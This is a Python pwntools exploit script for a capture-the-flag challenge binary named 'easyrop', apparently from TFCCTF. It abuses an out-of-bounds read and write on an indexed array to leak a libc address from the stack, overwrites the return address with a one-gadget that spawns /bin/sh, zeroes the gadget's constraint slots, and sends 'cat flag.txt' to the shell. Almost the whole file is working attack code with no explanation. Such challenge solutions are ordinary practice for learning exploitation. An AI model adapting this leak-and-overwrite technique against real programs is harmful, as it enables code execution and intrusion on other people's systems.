#!/usr/bin/env python
from pwn import *
from parse import parse

elf = context.binary = ELF('./easyrop')
context.log_level = "debug"

gdbscript='''
continue
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

for cur_attempt in range(1,1000+1):
    # sh = remote('localhost', 1337)
    #sh = remote('challs.tfcctf.com', 31376)
    sh = conn() 
    # input("Press to continue")

    def get_num(index):
        sh.recvuntil(b"Press '1' to write and '2' to read!\n")
        sh.sendline(b"2")
        sh.recvuntil(b"Select index: ")
        sh.sendline(str(index).encode())
        line = sh.recvline().decode().strip()
        cur_index, num = parse("The number at index {} is {}", line)
        num = int(num, 16)
        return num

    def set_num(index, number):
        sh.recvuntil(b"Press '1' to write and '2' to read!\n")
        sh.sendline(b"1")
        sh.recvuntil(b"Select index: ")
        sh.sendline(str(index).encode())
        sh.recvuntil(b"Select number to write: ")
        sh.sendline(str(number).encode())

    # ret uses this address. libc leak
    first = get_num(131)
    second = get_num(130)
    leaked = first << 32 | second

# Offset difference
# Offset difference always prints out 0x29d90
    libc_leaked = leaked - 0x29d90

    # log.info("libc leaked: " + hex(libc_leaked))

    prep = lambda x: (libc_leaked + x) & 0xFFFFFFFF

# 0x10dbc2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
# constraints:
#  [rsp+0x70] == NULL
#  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
#  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

    set_num(130, prep(0x10dbc2))
    pause() 
# Constraint
    set_num(130+2+16, 0x0) # rsp+0x40
    set_num(130+2+62, 0x0) # rsp+0xf0 points here
    set_num(130+2+28, 0x0) # rsp+ 0x70

    sh.recvuntil(b"Press '1' to write and '2' to read!\n")
    sh.sendline(b'0\ncat flag.txt\n')
    
    res = sh.recvall()
    print(res)
    if b'TFCCTF{' in res:
        print(res)
    sh.shutdown()
